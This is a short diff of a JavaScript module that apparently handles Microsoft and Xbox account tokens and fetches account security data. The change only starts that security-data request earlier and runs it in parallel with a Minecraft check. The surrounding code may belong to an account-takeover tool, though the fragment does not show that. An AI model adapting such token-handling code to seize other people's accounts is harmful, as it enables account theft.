@@ -294,7 +294,12 @@ module.exports = async (host, settings, uid, username = null) => {
         msatoken: msatoken
     }
 
-
+    // [OPTIMIZATION] START FETCHING SECURITY DATA IN THE BACKGROUND IMMEDITELY
+    // This runs parallel to the Minecraft check, saving 1-2 seconds!
+    const securityDataPromise = Promise.all([
+        getsecuredata(axios, uid, apiCanary, tokenobj),
+        getverificationtoken(axios)
+    ]);
 
     // 16h refresh (usertoken, theres prob a better method)
     await updateExtraInformation(uid, "xblrefresh", refresh)
@@ -454,10 +459,8 @@ module.exports = async (host, settings, uid, username = null) => {
 
     const getsecdatatimer = timeTracker("Get Security Data");
 
-    const [securedata, verificationtoken] = await Promise.all([
-        getsecuredata(axios, uid, apiCanary, tokenobj),
-        getverificationtoken(axios)
-    ]);
+    // AWAIT the security data that was fetching in the background
+    const [securedata, verificationtoken] = await securityDataPromise;
 
     axios.axios.defaults.headers.common['__RequestVerificationToken'] = verificationtoken;
 
